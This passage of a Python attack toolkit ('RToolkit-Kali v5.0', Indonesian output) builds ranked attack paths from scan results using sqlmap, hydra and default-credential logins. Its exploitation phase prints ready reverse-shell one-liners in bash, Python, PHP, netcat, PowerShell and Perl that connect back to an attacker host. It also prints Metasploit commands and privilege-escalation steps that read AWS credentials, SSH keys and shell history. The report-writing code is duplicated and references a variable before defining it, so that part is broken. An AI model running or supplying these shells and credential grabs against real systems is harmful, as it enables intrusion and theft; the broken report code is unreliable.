    sqli_vulns = [v for v in vulns if "sqli" in v.get("name","").lower() or "sql injection" in v.get("name","").lower()]

    # Helper: check if any CVE matches a keyword and has real exploit
    def has_cve_with_exploit(keyword):
        for c in cves:
            if keyword in c.get("software","").lower() and c.get("exploit_available"):
                return True
        return False

    def has_cve_any(keyword):
        return any(keyword in c.get("software","").lower() for c in cves)

    # 1. Web Entry → RCE
    web_cves = [c for c in cves if any(w in c.get("cve","").lower() for w in ["rce","remote code","code exec","shell"])]
    if web_cves:
        steps = [f"Web server exposed (HTTP/HTTPS)", f"CVE: {web_cves[0]['cve']}"]
        if has_cve_with_exploit("apache"):
            steps.append("Public exploit available")
        paths.append({
            "name": "Web Entry → Remote Code Execution",
            "steps": steps,
            "likelihood": "HIGH" if any(c.get("exploit_available") for c in web_cves) else "MEDIUM",
            "impact": "CRITICAL",
            "commands": [f"# RCE via {web_cves[0]['cve']}",
                        f"# Check: searchsploit --cve {web_cves[0]['cve']}",
                        f"curl -s 'http://{report_data.get('target','target')}/' -H 'Host: localhost'"]
        })

    # 2. SQL Injection → Data Exfiltration
    if sqli_vulns:
        paths.append({
            "name": "SQL Injection → Database Extraction",
            "steps": [f"{len(sqli_vulns)} SQLi point(s) found",
                     f"Affected params: {', '.join(v.get('param','?') for v in sqli_vulns[:3])}",
                     "Potential data: users, passwords, PII"],
            "likelihood": "HIGH" if len(sqli_vulns) > 1 else "MEDIUM",
            "impact": "CRITICAL",
            "commands": [f"sqlmap -u 'http://{report_data.get('target','target')}/' --batch --dbs",
                        f"sqlmap -u 'http://{report_data.get('target','target')}/' --batch --tables -D <database>",
                        f"# Or manual: ' OR 1=1 -- -, ' UNION SELECT ..."]
        })

    # 3. Database Direct Access
    db_ports = [p for p in ports if any(q in p for q in ["5432","3306","1433"])]
    db_vulns = [v for v in vulns if "database" in v.get("url","").lower() or "postgres" in v.get("name","").lower() or "mysql" in v.get("name","").lower()]
    if db_ports or db_vulns:
        steps = ["Database port(s) publicly exposed: "+", ".join(p for p in db_ports[:3])] if db_ports else []
        if db_vulns:
            steps.append("Default credentials found - direct access possible")
        paths.append({
            "name": "Database Direct → Data Breach",
            "steps": steps,
            "likelihood": "HIGH" if db_vulns else "MEDIUM",
            "impact": "CRITICAL",
            "commands": [
                f"PGPASSWORD='postgres' psql -h {report_data.get('target','target')} -U postgres -d postgres",
                f"mysql -h {report_data.get('target','target')} -u root -p"
            ]
        })

    # 4. Sensitive File Exposure
    exposed_files = [d for d in dirs if any(p in d.get("url","").lower() for p in [".env ",".git","config","sql","dump","backup","wp-config","phpinfo","admin"])]
    if exposed_files:
        paths.append({
            "name": "Sensitive File Exposure → Credential Leak",
            "steps": [f"{len(exposed_files)} sensitive file(s) exposed: " + ", ".join(d["url"].split("/")[-1] for d in exposed_files[:5]),
                     "Potential contents: credentials, API keys, source code"],
            "likelihood": "HIGH",
            "impact": "HIGH",
            "commands": ["curl -s '" + d["url"] + "'" for d in exposed_files[:3]]
        })

    # 5. SSH Bruteforce
    if any("22" in p for p in ports):
        ssh_cve = any("openssh" in c.get("software","").lower() for c in cves)
        paths.append({
            "name": "SSH Bruteforce / Remote Access",
            "steps": ["SSH (22) publicly exposed",
                     "Potential: password bruteforce, key-based auth" +
                     (" + Known CVE" if ssh_cve else "")],
            "likelihood": "MEDIUM" if ssh_cve else "LOW",
            "impact": "CRITICAL",
            "commands": [
                f"hydra -l root -P /usr/share/wordlists/rockyou.txt {report_data.get('target','target')} ssh",
                f"# Check for weak keys: ssh -o StrictHostKeyChecking=no root@{report_data.get('target','target')}"
            ]
        })

    # 6. WAF Bypass → Access Restricted Resources
    waf_bypasses = [v for v in vulns if "waf bypass" in v.get("name","").lower()]
    if waf_bypasses:
        paths.append({
            "name": "WAF Bypass → Restricted Resource Access",
            "steps": [f"{len(waf_bypasses)} WAF bypass(es) successful",
                     "Access sensitive files behind WAF"],
            "likelihood": "HIGH",
            "impact": "HIGH",
            "commands": [f"# Bypass technique: {waf_bypasses[0].get('name','')}",
                        f"curl -s '{waf_bypasses[0].get('url','')}' -H 'X-Forwarded-For: 127.0.0.1'"]
        })

    # 7. WordPress-Specific Chain
    wp_techs = [t for t in techs if "wordpress" in t.lower()]
    wp_plugins_cves = [c for c in cves if "plugin" in c.get("software","").lower()]
    if wp_techs or wp_plugins_cves:
        steps = ["WordPress detected"]
        if wp_plugins_cves:
            steps.append(f"{len(wp_plugins_cves)} plugin CVE(s) identified (THEORETICAL)")
        paths.append({
            "name": "WordPress Multi-Stage Attack",
            "steps": steps,
            "likelihood": "MEDIUM",
            "impact": "HIGH",
            "commands": [
                f"wpscan --url http://{report_data.get('target','target')}/ --enumerate vp,vt,tt",
                f"# Enable XML-RPC: POST http://{report_data.get('target','target')}/xmlrpc.php",
                f"# Bruteforce: wpscan --url http://{report_data.get('target','target')}/ --passwords rockyou.txt"
            ]
        })

    # Score each path
    for path in paths:
        likelihood_score = {"HIGH": 3, "MEDIUM": 2, "LOW": 1}.get(path["likelihood"], 1)
        impact_score = {"CRITICAL": 3, "HIGH": 2, "MEDIUM": 1}.get(path["impact"], 1)
        path["priority_score"] = likelihood_score * impact_score

    # Sort by priority
    paths.sort(key=lambda p: p["priority_score"], reverse=True)
    return paths

# ====== PHASE 5: EXPLOITATION ENGINE ======
@timer
def phase5_exploit(domain):
    """Phase 5: Exploitation — reverse shell + exploit commands."""
    print(f"\n{c('='*65,Y)}")
    print(f"  {c('PHASE 5: EXPLOIT — Menyusun perintah serangan',BOLD)}")
    print(f"  {c('  ⤷ Reverse shell + perintah exploit untuk dicoba manual',DIM)}")
    print(f"{c('='*65,Y)}")

    lhost = cfg("lhost", "YOUR_IP")
    lport = cfg("lport", 4444)

    # Reverse shells
    print(f"\n  {c('[+] Reverse Shell Payloads',G)}")
    shells = [
        ("bash", f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"),
        ("python", f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"),
        ("php", f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
        ("nc", f"nc -e /bin/sh {lhost} {lport}"),
        ("powershell", f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient(\'{lhost}\',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+\"PS \"+(pwd).Path+\"> \";$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()"'),
        ("perl", f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"),
        ("nc_pipe", f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"),
    ]
    for name, cmd in shells:
        if len(name+cmd) < 120:
            print(f"    {c(name+':',C)} {cmd}")
        else:
            print(f"    {c(name+':',C)} {cmd[:70]}...")

    # Exploit dari CVE (v5.0: dynamic + searchsploit)
    if REPORT["cves"]:
        print(f"\n  {c('[+] Exploit Commands dari CVEs:',R)}")
        seen = set()
        exploit_map = {
            "apache": ["msfconsole -q -x 'use exploit/multi/http/apache_mod_proxy_rce; set RHOSTS "+domain+"; run'"],
            "openssh": ["python3 CVE-2024-6387.py "+domain+" 22"],
            "php": ["phpggc -p phar -o exploit.phar 'RCE:system(id)'"],
            "postgresql": ["psql -h "+domain+" -U postgres -c 'SELECT version()'"],
        }
        for cv in REPORT["cves"]:
            sw = cv["software"].lower()
            # Show dynamic exploit commands from searchsploit results
            if cv.get("exploit_available") and cv.get("exploit_edb_id"):
                cmd_key = f"searchsploit -m {cv['exploit_edb_id']}"
                if cmd_key not in seen:
                    seen.add(cmd_key)
                    print(f"    {c('➜',M)} searchsploit -m {cv['exploit_edb_id']}  ({cv['cve'][:40]})")
                    print(f"      {c(cv.get('exploit_title','')[:80],DIM)}")
            # Also try the static exploit_map
            for key, cmds in exploit_map.items():
                if key in sw:
                    for cmd in cmds:
                        if cmd not in seen:
                            seen.add(cmd)
                            print(f"    {c('➜',M)} {cmd}  ({cv['cve'][:40]})")

    # v5.0: Attack Paths
    if cfg("enable_attack_paths", True):
        paths = generate_attack_paths(REPORT)
        if paths:
            REPORT["attack_paths"] = paths
            print(f"\n  {c('[+] Attack Paths — Jalur Serangan Prioritas',R)}")
            print(f"  {c('  ⤷ Berdasarkan chaining semua temuan: port + CVE + vuln + exploit',DIM)}")
            for i, path in enumerate(paths[:5], 1):
                priority_label = c("🔴 PRIORITAS",R) if path["priority_score"] >= 6 else c("🟡 LIHAT",Y) if path["priority_score"] >= 3 else c("🟢 CATAT",G)
                print(f"\n  {c(f'{i}. [{priority_label}]',BOLD)} {c(path[\"name\"],W)}")
                print(f"     {c('Likelihood:',C)} {c(path[\"likelihood\"],G if path[\"likelihood\"]==\"HIGH\" else Y)}  "
                      f"{c('Impact:',C)} {c(path[\"impact\"],R if path[\"impact\"]==\"CRITICAL\" else Y)}  "
                      f"{c('Score:',C)} {path['priority_score']}")
                for step in path["steps"][:4]:
                    print(f"     {c('▸',DIM)} {step}")
                for cmd in path["commands"][:2]:
                    print(f"     {c('$',M)} {c(cmd[:80],DIM)}")
            if len(paths) > 5:
                print(f"  ... +{len(paths)-5} more attack paths (see report)")

    # Privesc
    print(f"\n  {c('[+] Linux Privesc Commands',G)}")
    for label, cmd in [
        ("SUID","find / -perm -4000 -type f 2>/dev/null"),
        ("sudo","sudo -l 2>/dev/null"),
        ("Cron","ls -la /etc/cron* 2>/dev/null"),
        ("Kernel","uname -a"),
        ("SSH Keys","find / -name id_rsa -o -name id_dsa 2>/dev/null"),
        ("Docker","docker ps 2>/dev/null; groups | grep docker"),
        ("AWS","cat ~/.aws/credentials 2>/dev/null"),
        ("History","cat ~/.bash_history 2>/dev/null | tail -20"),
        ("Network","ss -tulanp 2>/dev/null || netstat -tulanp"),
    ]:
        print(f"    {c(label+':',C)} {cmd}")

# ====== PHASE 6: REPORTING ======
@timer
def phase6_report(domain):
    print(f"\n{c('='*65,Y)}")
    print(f"  {c('PHASE 6: REPORT — Membuat laporan hasil scan',BOLD)}")
    print(f"  {c('  ⤷ Ringkasan temuan + HTML report + JSON report',DIM)}")
    print(f"{c('='*65,Y)}")

    for v in REPORT["vulnerabilities"]:
        s = v.get("severity", "INFO").upper()
        if s in REPORT["summary"]:
            REPORT["summary"][s] += 1
        REPORT["summary"]["total"] += 1

    REPORT["phase_times"] = phase_times
    s = REPORT["summary"]
    total_time = int(sum(phase_times.values()))

    # v5.0: Count CVEs by source and confidence
    conf_src = REPORT.get("cve_confidence", {"confirmed":0,"suspected":0,"theoretical":0})
    cve_srcs = REPORT.get("cve_sources", {"local_db":0,"nvd_api":0,"hardcoded":0})
    print(f"""
  {c('╔═══════════════════════════════════════════════════════════╗',Y)}
  {c('║',Y)}        {c('📊 LAPORAN AKHIR — '+domain.upper()+' (v5.0)',BOLD)}           {c('║',Y)}
  {c('╠═══════════════════════════════════════════════════════════╣',Y)}
  {c('║',Y)}  {c('CVEs:',C)}    {c(str(len(REPORT['cves'])).rjust(6),W)}  {c('Vulns:',C)} {c(str(s['total']).rjust(5),W)}  {c('Exploit:',C)} {c(str(REPORT.get('exploit_available_count',0)).rjust(4),R)}  {c('Paths:',C)} {c(str(len(REPORT.get('attack_paths',[]))).rjust(4),W)}   {c('║',Y)}
  {c('║',Y)}  {c('Critical:',C)} {c(str(s['critical']).rjust(4),R)}  {c('High:',C)} {c(str(s['high']).rjust(4),R)}  {c('Medium:',C)} {c(str(s['medium']).rjust(4),Y)}  {c('Time:',C)} {c(str(total_time)+'s',W).rjust(6)} {c('║',Y)}
  {c('╠═══════════════════════════════════════════════════════════╣',Y)}
  {c('║',Y)}  {c('[v5.0] Confidence:',C)}                                           {c('║',Y)}
  {c('║',Y)}  {c('CONFIRMED:',C)} {c(str(conf_src.get('confirmed',0)).rjust(3),G)}  {c('SUSPECTED:',C)} {c(str(conf_src.get('suspected',0)).rjust(3),Y)}  {c('THEORETICAL:',C)} {c(str(conf_src.get('theoretical',0)).rjust(3),R)}   {c('║',Y)}
  {c('║',Y)}  {c('[v5.0] Sources:',C)} {c(str(cve_srcs.get('local_db',0)).rjust(3),W)} local  {c(str(cve_srcs.get('nvd_api',0)).rjust(3),C)} NVD  {c(str(cve_srcs.get('hardcoded',0)).rjust(3),R)} hardcoded {c('║',Y)}
  {c('╠═══════════════════════════════════════════════════════════╣',Y)}
  {c('║',Y)}  {c('-> Prioritas: perbaiki CRITICAL & HIGH dulu!',BOLD)}             {c('║',Y)}""")
    if s['critical'] > 0:
        risk = "🔴 KRITIS — Segera tindak!"
    elif s['high'] > 0:
        risk = "🟠 TINGGI — Prioritaskan!"
    elif s['medium'] > 0:
        risk = "🟡 SEDANG — Jadwalkan perbaikan"
    else:
        risk = "🟢 RENDAH — Terus pantau"
    print(f"  {c('║',Y)}  {c(risk.ljust(53),BOLD)} {c('║',Y)}")
    print(f"  {c('╚═══════════════════════════════════════════════════════════╝',Y)}")

    # HTML Report
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    cve_rows = "".join(
        f'<tr><td>{cv["port"]}</td><td>{cv["software"]}</td><td>{cv["version"]}</td>'
        f'<td class="sev-{cv["severity"]}">{cv["cve"]}</td>'
        f'<td class="sev-{cv["severity"]}">{cv["severity"]}</td>'
        f'<td class="conf-{cv.get("confidence","SUSPECTED")}">{cv.get("confidence","?")}</td>'
        f'<td class="{"exploit-yes" if cv.get("exploit_available") else "exploit-no"}">{"EXPLOIT: "+str(cv.get("exploit_edb_id","")) if cv.get("exploit_available") else "---"}</td></tr>'
        for cv in REPORT["cves"][:100])
    vuln_rows = "".join(
        f'<tr><td>{v["name"][:60]}</td>'
        f'<td class="sev-{v.get("severity","INFO")}">{v.get("severity","INFO")}</td>'
        f'<td>{v.get("url","")[:60]}</td><td>{v.get("source","")}</td></tr>'
        for v in REPORT["vulnerabilities"][:100])
    sqli_count = len([v for v in REPORT["vulnerabilities"] if "sqli" in v.get("name","").lower() or "sql" in v.get("name","").lower()])
    sqli_rows = "".join(
        f'<tr><td>{v["name"][:60]}</td>'
        f'<td class="sev-{v.get("severity","INFO")}">{v.get("severity","INFO")}</td>'
        f'<td>{v.get("url","")[:60]}</td><td>{v.get("source","")}</td></tr>'
        for v in REPORT["vulnerabilities"] if "sqli" in v.get("name","").lower() or "sql" in v.get("name","").lower())
    conf_src = REPORT.get("cve_confidence", {"confirmed":0,"suspected":0,"theoretical":0})
    cve_srcs = REPORT.get("cve_sources", {"local_db":0,"nvd_api":0,"hardcoded":0})
    paths = REPORT.get("attack_paths", [])
    recs = generate_remediation_v5(conf_src)
    rec_rows = "".join(f'<li>{r}</li>' for r in recs)

    html = f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><title>RToolkit v5.0 Report - {domain}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}} body{{font-family:'Segoe UI',sans-serif;background:#0d1117;color:#c9d1d9;padding:20px}}
.container{{max-width:1200px;margin:0 auto}} .header{{background:linear-gradient(135deg,#161b22,#1c2128);border:1px solid #30363d;border-radius:8px;padding:30px;margin-bottom:24px;text-align:center}}
.header h1{{color:#ff6b6b;font-size:28px}} .header .target{{color:#58a6ff;font-size:18px}}
.stats{{display:grid;grid-template-columns:repeat(8,1fr);gap:12px;margin-bottom:24px}}
.stat-box{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px;text-align:center}}
.stat-box .num{{font-size:28px;font-weight:bold}} .stat-box .label{{font-size:12px;color:#8b949e}}
.section{{background:#161b22;border:1px solid #30363d;border-radius:8px;margin-bottom:20px}}
.section h2{{background:#1c2128;padding:12px 20px;font-size:16px;border-bottom:1px solid #30363d;color:#58a6ff}}
.section-content{{padding:16px 20px}} table{{width:100%;border-collapse:collapse}}
th{{text-align:left;padding:8px 12px;font-size:12px;text-transform:uppercase;color:#8b949e;border-bottom:1px solid #30363d}}
td{{padding:8px 12px;border-bottom:1px solid #21262d;font-size:13px}}
tr:hover{{background:#1c2128}} .sev-CRITICAL{{color:#ff6b6b;font-weight:bold}} .sev-HIGH{{color:#ff6b6b;font-weight:bold}}
.sev-MEDIUM{{color:#d29922;font-weight:bold}} .sev-LOW{{color:#58a6ff}}
.conf-CONFIRMED{{color:#3fb950;font-weight:bold}} .conf-SUSPECTED{{color:#d29922;font-weight:bold}} .conf-THEORETICAL{{color:#f85149}}
.exploit-yes{{color:#f85149;font-weight:bold}} .exploit-no{{color:#8b949e}} .path-HIGH{{color:#f85149}} .path-MEDIUM{{color:#d29922}} .path-LOW{{color:#58a6ff}}
.path-box{{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:12px 16px;margin-bottom:12px}}
.path-title{{color:#ff6b6b;font-weight:bold;margin-bottom:6px}} .path-meta{{color:#8b949e;font-size:12px;margin-bottom:4px}}
</style></head><body><div class="container">
<div class="header"><h1>RToolkit-Kali v5.0 Report</h1><div class="target">{domain}</div><div style="color:#8b949e;font-size:14px">Generated: {REPORT["timestamp"]}</div></div>
<div class="stats">
<div class="stat-box"><div class="num" style="color:#ff6b6b">{s["critical"]}</div><div class="label">Critical</div></div>
<div class="stat-box"><div class="num" style="color:#ff6b6b">{s["high"]}</div><div class="label">High</div></div>
<div class="stat-box"><div class="num" style="color:#d29922">{s["medium"]}</div><div class="label">Medium</div></div>
<div class="stat-box"><div class="num" style="color:#58a6ff">{s["low"]}</div><div class="label">Low</div></div>
<div class="stat-box"><div class="num" style="color:#8b949e">{s["total"]}</div><div class="label">Total Vulns</div></div>
<div class="stat-box"><div class="num" style="color:#f85149">{REPORT.get("exploit_available_count",0)}</div><div class="label">Exploits</div></div>
<div class="stat-box"><div class="num" style="color:#3fb950">{conf_src.get("confirmed",0)}</div><div class="label">Confirmed</div></div>
<div class="stat-box"><div class="num" style="color:#58a6ff">{total_time}s</div><div class="label">Duration</div></div>
</div>
<div class="section"><h2>Confidence Breakdown</h2><div class="section-content">
<span class="conf-CONFIRMED">{conf_src.get('confirmed',0)} CONFIRMED</span> |
<span class="conf-SUSPECTED">{conf_src.get('suspected',0)} SUSPECTED</span> |
<span class="conf-THEORETICAL">{conf_src.get('theoretical',0)} THEORETICAL</span> (plugin CVEs without version verification)<br>
<span style="color:#8b949e">Sources: {cve_srcs.get('local_db',0)} local_db | {cve_srcs.get('nvd_api',0)} nvd_api | {cve_srcs.get('hardcoded',0)} hardcoded</span>
</div></div>
<div class="section"><h2>Subdomains ({len(REPORT["subdomains"])})</h2><div class="section-content"><table><tr><th>Subdomain</th></tr>{sub_rows}</table></div></div>
<div class="section"><h2>CVEs ({len(REPORT["cves"])})</h2><div class="section-content"><table><tr><th>Port</th><th>Software</th><th>Version</th><th>CVE</th><th>Severity</th><th>Confidence</th><th>Exploit</th></tr>{cve_rows}</table></div></div>
<div class="section"><h2>SQL Injection ({sqli_count})</h2><div class="section-content">{'<table><tr><th>Name</th><th>Severity</th><th>URL</th><th>Source</th></tr>'+sqli_rows+'</table>' if sqli_rows else '<p style="color:#8b949e">None detected</p>'}</div></div>
<div class="section"><h2>Attack Paths ({len(paths)})</h2><div class="section-content">
{'<div class="path-box"><div class="path-title">'+'<br>'.join([
f"<b>{p['name']}</b> [<span class='path-{p['likelihood']}'>{p['likelihood']}</span>/<span class='path-{p['impact']}'>{p['impact']}</span> score={p.get('priority_score',0)}]<br>"+
"<br>".join(f"  - {s}" for s in p["steps"])+
"<br><code>"+"</code><br><code>".join(p["commands"][:2])+"</code>"
for p in paths[:7]
])+'</div></div>' if paths else '<p style="color:#8b949e">No attack paths identified. Low finding count or all findings are theoretical.</p>'}
</div></div>
<div class="section"><h2>Vulnerabilities ({len(REPORT["vulnerabilities"])})</h2><div class="section-content"><table><tr><th>Name</th><th>Severity</th><th>URL</th><th>Source</th></tr>{vuln_rows}</table></div></div>
<div class="section"><h2>Remediation Recommendations</h2><div class="section-content"><ul style="padding-left:20px;line-height:1.8">{rec_rows}</ul></div></div>
</div></body></html>"""
    rec_rows = "".join(f'<li>{r}</li>' for r in recs)
    sub_rows = "".join(f'<tr><td>{s}</td></tr>' for s in REPORT["subdomains"][:50])

    html = f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><title>RToolkit v5.0 Report - {domain}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}} body{{font-family:'Segoe UI',sans-serif;background:#0d1117;color:#c9d1d9;padding:20px}}
.container{{max-width:1200px;margin:0 auto}} .header{{background:linear-gradient(135deg,#161b22,#1c2128);border:1px solid #30363d;border-radius:8px;padding:30px;margin-bottom:24px;text-align:center}}
.header h1{{color:#ff6b6b;font-size:28px}} .header .target{{color:#58a6ff;font-size:18px}}
.stats{{display:grid;grid-template-columns:repeat(6,1fr);gap:12px;margin-bottom:24px}}
.stat-box{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px;text-align:center}}
.stat-box .num{{font-size:32px;font-weight:bold}} .stat-box .label{{font-size:12px;color:#8b949e}}
.section{{background:#161b22;border:1px solid #30363d;border-radius:8px;margin-bottom:20px}}
.section h2{{background:#1c2128;padding:12px 20px;font-size:16px;border-bottom:1px solid #30363d;color:#58a6ff}}
.section-content{{padding:16px 20px}} table{{width:100%;border-collapse:collapse}}
th{{text-align:left;padding:8px 12px;font-size:12px;text-transform:uppercase;color:#8b949e;border-bottom:1px solid #30363d}}
td{{padding:8px 12px;border-bottom:1px solid #21262d;font-size:13px}}
tr:hover{{background:#1c2128}} .sev-CRITICAL{{color:#ff6b6b;font-weight:bold}} .sev-HIGH{{color:#ff6b6b;font-weight:bold}}
.sev-MEDIUM{{color:#d29922;font-weight:bold}} .sev-LOW{{color:#58a6ff}}
</style></head><body><div class="container">
<div class="header"><h1>RToolkit-Kali v5.0 Report</h1><div class="target">{domain}</div><div style="color:#8b949e;font-size:14px">Generated: {REPORT["timestamp"]}</div></div>
<div class="stats">
<div class="stat-box"><div class="num" style="color:#ff6b6b">{s["critical"]}</div><div class="label">Critical</div></div>
<div class="stat-box"><div class="num" style="color:#ff6b6b">{s["high"]}</div><div class="label">High</div></div>
<div class="stat-box"><div class="num" style="color:#d29922">{s["medium"]}</div><div class="label">Medium</div></div>
<div class="stat-box"><div class="num" style="color:#58a6ff">{s["low"]}</div><div class="label">Low</div></div>
<div class="stat-box"><div class="num" style="color:#8b949e">{s["total"]}</div><div class="label">Total Vulns</div></div>
<div class="stat-box"><div class="num" style="color:#58a6ff">{total_time}s</div><div class="label">Duration</div></div>
</div>
<div class="section"><h2>Subdomains ({len(REPORT["subdomains"])})</h2><div class="section-content"><table><tr><th>Subdomain</th></tr>{sub_rows}</table></div></div>
<div class="section"><h2>CVEs ({len(REPORT["cves"])})</h2><div class="section-content"><table><tr><th>Port</th><th>Software</th><th>Version</th><th>CVE</th><th>Severity</th></tr>{cve_rows}</table></div></div>
<div class="section"><h2>SQL Injection ({sqli_count})</h2><div class="section-content">{'<table><tr><th>Name</th><th>Severity</th><th>URL</th><th>Source</th></tr>'+sqli_rows+'</table>' if sqli_rows else '<p style="color:#8b949e">None detected</p>'}</div></div>
<div class="section"><h2>Vulnerabilities ({len(REPORT["vulnerabilities"])})</h2><div class="section-content"><table><tr><th>Name</th><th>Severity</th><th>URL</th><th>Source</th></tr>{vuln_rows}</table></div></div>
<div class="section"><h2>Remediation Recommendations</h2><div class="section-content"><ul style="padding-left:20px;line-height:1.8">{rec_rows}</ul></div></div>
</div></body></html>"""

    if not (ARGS and ARGS.json):
        html_fn = f"RToolkit_Report_{domain.replace('.','_')}_{ts}.html"
        with open(html_fn, "w", encoding="utf-8") as f:
            f.write(html)
        print(f"\n  {c(f'HTML: {html_fn}',G)}")
    json_fn = f"RToolkit_Report_{domain.replace('.','_')}_{ts}.json"
    with open(json_fn, "w") as f:
        json.dump(REPORT, f, indent=2, default=str)
    print(f"  {c(f'JSON: {json_fn}',G)}")

# ====== PHASE 1c: TECH DETECTION + HTTP HEADERS + SSL BYPASS ======
@timer
def phase1c_tech_deep(domain, live_urls):
    print(f"\n{c('='*65,Y)}")
    print(f"  {c('PHASE 1c: TEKNOLOGI — Deteksi CMS, framework, & header keamanan',BOLD)}")
    print(f"  {c('  ⤷ Identifikasi WordPress/Joomla/Drupal, JS framework, CDN, cookie',DIM)}")
    print(f"{c('='*65,Y)}")
    if not live_urls:
        live_urls = [f"http://{domain}", f"https://{domain}"]
    for url in live_urls[:3]:
        # HTTP Security Headers
        print(f"\n  {c('[HTTP Security Headers]',G)} {url}")
        sec_headers = ["Strict-Transport-Security","Content-Security-Policy",
            "X-Content-Type-Options","X-Frame-Options","X-XSS-Protection",
            "Referrer-Policy","Permissions-Policy","Access-Control-Allow-Origin"]
        if HAS_REQUESTS:
            try:
                r = requests.get(url, timeout=10, verify=False)
                hdr_table = []
                score = 0
                for sh in sec_headers:
                    val = r.headers.get(sh, c("MISSING",R))
                    if val != c("MISSING",R): score += 1
                    hdr_table.append([sh, str(val)[:60]])
                print_table(["Header","Value"], hdr_table, "[HEADERS]")
                print(f"    Security Score: {c(f'{score}/9',G if score>=5 else Y if score>=3 else R)}")
                REPORT["http_headers"] = dict(r.headers)
            except:
                print(f"    {c('Could not fetch headers',Y)}")
        # Deep tech detection
        print(f"\n  {c('[Deep Tech Detection]',G)} {url}")
        techs = detect_tech_version(url)
        if techs:
            tech_table = []
            version_keys = {}
            for k, v in techs.items():
                if k.endswith("_version") or k in ["Server","Language","CMS","Framework","CDN","JS_Framework"]:
                    version_keys[k] = v
            for k, v in version_keys.items():
                tech_table.append([k, str(v)[:80]])
            if tech_table:
                print_table(["Technology","Version/Detail"], tech_table, "[TECH]")
                REPORT["technologies"].extend([f"{k}: {v}" for k,v in version_keys.items()])
            # Enhanced CVE matching (v5: semver + confidence)
            cves = match_cves_enhanced(techs)
            if cves:
                CONF_COLORS2 = {"CONFIRMED": G, "SUSPECTED": Y, "THEORETICAL": R}
                cve_table = []
                for cv in cves:
                    sev = cv.get("severity","HIGH")
                    conf = cv.get("confidence","?")
                    cve_table.append([cv["software"], cv["version"],
                        c(cv["cve"],R if sev in ["CRITICAL","HIGH"] else Y),
                        sev, c(conf[:10], CONF_COLORS2.get(conf, DIM))])
                print_table(["Software","Version","CVE","Sev","Conf"], cve_table, "[CVES]")
                for cv in cves:
                    sev = cv.get("severity","HIGH").lower()
                    conf = cv.get("confidence","SUSPECTED")
                    src = cv.get("source","local_db")
                    vmt = cv.get("version_match_type","exact")
                    if not any(c.get('cve')==cv['cve'] for c in REPORT["cves"]):
                        entry = {"port":80,"service":"http","software":cv["software"],
                            "version":cv["version"],"cve":cv["cve"],"severity":cv.get("severity","HIGH"),
                            "confidence":conf,"source":src,"version_match_type":vmt}
                        REPORT["cves"].append(entry)
                        REPORT["summary"][sev] = REPORT["summary"].get(sev,0)+1
                        REPORT["summary"]["total"] += 1
                        REPORT["cve_sources"][src] = REPORT["cve_sources"].get(src,0)+1
                        REPORT["cve_confidence"][conf.lower()] = REPORT["cve_confidence"].get(conf.lower(),0)+1
            # WP Plugins/Themes
            if "WP_Plugins" in techs:
                plug_table = [[p, "Unknown"] for p in techs["WP_Plugins"]]
                print_table(["Plugin Name","Version"], plug_table, "[WP PLUGINS]")
                REPORT["wp_plugins"] = techs["WP_Plugins"]
            if "WP_Themes" in techs:
                theme_table = [[t, "Unknown"] for t in techs["WP_Themes"]]
                print_table(["Theme Name","Version"], theme_table, "[WP THEMES]")
                REPORT["wp_themes"] = techs["WP_Themes"]
        # WAF bypass sensitive files probe
        print(f"\n  {c('[WAF Bypass — Sensitive File Probe]',G)} {url}")
        sensitive_targets = ["/.env","/admin/","/wp-config.php.bak","/.git/config",
            "/backup.zip","/config.php","/phpinfo.php","/server-status","/dump.sql"]
        bypass_found = False
        for s_target in sensitive_targets:
            result = fetch_sensitive_with_bypass(url, s_target)
            if result:
                print(f"    {c(f'[!] ACCESSIBLE: {s_target}',R)}")
                print(f"    Preview: {result[:150]}")
                REPORT["vulnerabilities"].append({"name":f"WAF Bypass: {s_target}",
                    "severity":"HIGH","url":url+s_target,"source":"fetch_sensitive_with_bypass"})
                bypass_found = True
            else:
                print(f"    - {s_target}: blocked")
        if not bypass_found:
            print(f"    {c('No bypass results',DIM)}")
        break

# ====== PHASE 2b: DEEP DIRECTORY BRUTEFORCE (from rtoolkit.py) ======
@timer
def phase2b_deep_dir_bruteforce(domain, live_urls):
    print(f"\n{c('='*65,Y)}")
    print(f"  {c('PHASE 2b: DIRECTORY — Bruteforce direktori 2 level',BOLD)}")
    print(f"  {c('  ⤷ Mencari path tersembunyi dengan 300+ kata, recursive 2 level',DIM)}")
    print(f"{c('='*65,Y)}")
    for url in live_urls[:2]:
        try:
            base_domain = url.split('//')[-1].split('/')[0]
            print(f"\n  {c(f'[+] Testing {len(DIR_WORDLIST)} paths (2 levels deep)',G)} {url}")
            dirs = dir_bruteforce(url)
            if dirs:
                dir_table = []
                for d in sorted(dirs, key=lambda x: x.get("url",""))[:40]:
                    size_kb = round(d["size"]/1024,1) if d["size"] > 0 else 0
